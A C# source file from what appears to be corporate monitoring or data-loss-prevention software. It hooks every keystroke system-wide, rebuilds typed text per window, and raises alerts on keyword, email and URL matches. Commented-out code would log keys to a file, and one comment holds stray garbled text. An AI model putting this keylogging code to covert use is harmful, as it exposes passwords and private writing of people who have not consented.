using Keystroke.API;
using Keystroke.API.CallbackObjects;
using NativeSupportServiceApplication.Models;
using NativeSupportServiceApplication.Utils;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Windows.Storage.Streams;

namespace NativeSupportServiceApplication.Modules
{

    class KeyStrokeCache
    {


        public static ConcurrentDictionary<String, KeyStrokeBuffer> cache = new ConcurrentDictionary<string, KeyStrokeBuffer>();
        public static void appendCharacter(char c, String windowTitle)
        {

           
           
            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;

            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle);

            if (keyBuffer.isSelectAll)
            {
                keyBuffer.clear();
            }

            keyBuffer.appendCharacter(c);

        }

        public static void deleteChar(String windowTitle, String action)
        {

           
            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle) ;
            if (keyBuffer.isSelectAll)
            {             
                keyBuffer.clear();
            }
            else
            {
                keyBuffer.deleteLastChar(action);
            }

        }

        public static void updateCursor(String windowTitle, String action)
        {



            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
            KeyStrokeBuffer keyBuffer = getKeyBuffer(windowTitle);


            if (action.Equals("<left>"))
            {

                keyBuffer.leftVal++;
                if (keyBuffer.stringValue().Length < keyBuffer.leftVal)
                {
                    keyBuffer.leftVal = keyBuffer.stringValue().Length;
                }

            }
            else if (action.Equals("<right>"))
            {
                keyBuffer.leftVal--;

                if (keyBuffer.leftVal < 0)
                {
                    keyBuffer.leftVal = 0;
                }
            }
            else if (action.Equals("<home>"))
            {

                keyBuffer.leftVal = keyBuffer.stringValue().Length;



            }
            else if (action.Equals("<end>"))
            {

                keyBuffer.leftVal = 0;
            }

            Debug.WriteLine("lval" + keyBuffer.leftVal);

        }

        private static KeyStrokeBuffer getKeyBuffer(String windowTitle)
        {
            KeyStrokeBuffer keyBuffer;
            if (cache.ContainsKey(windowTitle))
            {
                keyBuffer = cache.GetValueOrDefault(windowTitle);



            }
            else
            {

                keyBuffer = new KeyStrokeBuffer();


                cache.TryAdd(windowTitle, keyBuffer);

            }
            return keyBuffer;
        }



        internal static KeyStrokeBuffer getInstance(String windowTitle)
        {
            windowTitle = String.IsNullOrEmpty(windowTitle) ? "DefCorporateEyeWindow!@34" : windowTitle;
            return getKeyBuffer(windowTitle);

        }
    }

    class KeyStrokeBuffer
    {
        private StringBuilder keyStrokeBuffer = new StringBuilder();

        private int MAX_LENGTH = 1024;

        public int leftVal = 0;

        public Boolean isControl = false, isSelectAll = false;

        public void clear()
        {
            keyStrokeBuffer.Clear();
            leftVal = 0;
        }

        public String stringValue()
        {
            return keyStrokeBuffer.ToString();
        }
        public KeyStrokeBuffer appendCharacter(char c)
        {


            keyStrokeBuffer.Insert(keyStrokeBuffer.Length - leftVal, c);

            if (keyStrokeBuffer.Length > MAX_LENGTH)
            {
                keyStrokeBuffer.Remove(0, 1);

            }
            return this;
        }
        public KeyStrokeBuffer deleteLastChar(String action)
        {

            Debug.WriteLine("lval" + leftVal);
            if (keyStrokeBuffer.Length > 0)
            {
                if (action.Equals("<backspace>"))
                {

                    if (keyStrokeBuffer.Length != 0)
                    {

                        keyStrokeBuffer.Remove(keyStrokeBuffer.Length - 1 - leftVal, 1);
                        // leftVal--;
                    }
                    else
                    {
                        leftVal = 0;
                    }

                }
                else
                {

                    if (keyStrokeBuffer.Length != 0 && leftVal != 0)
                    {

                        keyStrokeBuffer.Remove(keyStrokeBuffer.Length - leftVal, 1);
                        leftVal--;
                    }
                    else
                    {
                        // leftVal = 0;
                    }

                }
            }
            Debug.WriteLine("Now line " + keyStrokeBuffer.ToString());
            return this;
        }
    }
    class InterceptKeys
    {




        public static int leftCount = 0;
        public static void startMonitor()
        {
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { callback(character); });
                Application.Run();
            }

        }


        private static void callback(KeyPressed keyPressed)
        {



            try
            {

                String windowTitle = keyPressed.CurrentWindow;

                if (KeyStrokeCache.getInstance(windowTitle).isControl)
                {
                    if (keyPressed.ToString().Equals("a"))
                    {
                        KeyStrokeCache.getInstance(windowTitle).isSelectAll = true;
                        KeyStrokeCache.getInstance(windowTitle).isControl = false;
                    }
                }
                else
                {

                    if (keyPressed.ToString().Length == 1)
                    {
                        char vkCode = Char.Parse(keyPressed.ToString());



                        if (vkCode > 31 && vkCode < 127)
                        {



                            KeyStrokeCache.appendCharacter(vkCode, windowTitle);

                            //Debug.WriteLine(vkCode);

                           


                        }

                    }

                    else if (keyPressed.ToString().Equals("<backspace>") || keyPressed.ToString().Equals("<delete>"))
                    {
                        // 
                        KeyStrokeCache.deleteChar(windowTitle, keyPressed.ToString());
                    }
                    else if (keyPressed.KeyCode.ToString().EndsWith("ControlKey"))
                    {
                        KeyStrokeCache.getInstance(windowTitle).isControl = true;
                    }
                    else
                    {
                        KeyStrokeCache.updateCursor(windowTitle, keyPressed.ToString());
                    }

                    processKeypress(windowTitle);

                    KeyStrokeCache.getInstance(windowTitle).isSelectAll = false;
                }

            }
            catch
            {
            }

            //if (vkCode == 67)
            //{
            //    Application.Exit();
            //}
            //  Debug.WriteLine(life is beautiful life is beautiful yStrokeCache.cache);
            //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            //sw.Write((Keys)vkCode + "\n");
            //sw.Close();


        }

      

        
        private static void processKeypress(string windowTitle)
        {
            try
            {
                KeyStrokeCache.cache.TryGetValue(windowTitle, out var buffer);
                Debug.WriteLine(windowTitle + buffer.stringValue());

                var keyWordResult = GeneralUtil.checkKeywordMatch(buffer.stringValue());
                var emailResult = GeneralUtil.checkEmailMatch(buffer.stringValue());
                var urlResult = GeneralUtil.checkUrlMatch(buffer.stringValue());

                if (keyWordResult != null)
                {
                    AlertHandler.handle(keyWordResult, EventSource.KEYBOARD);
                }
                if (urlResult != null)
                {
                    AlertHandler.handle(urlResult, EventSource.KEYBOARD);
                }

                if (emailResult != null)
                {
                    AlertHandler.handle(emailResult, EventSource.KEYBOARD);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }




    }
}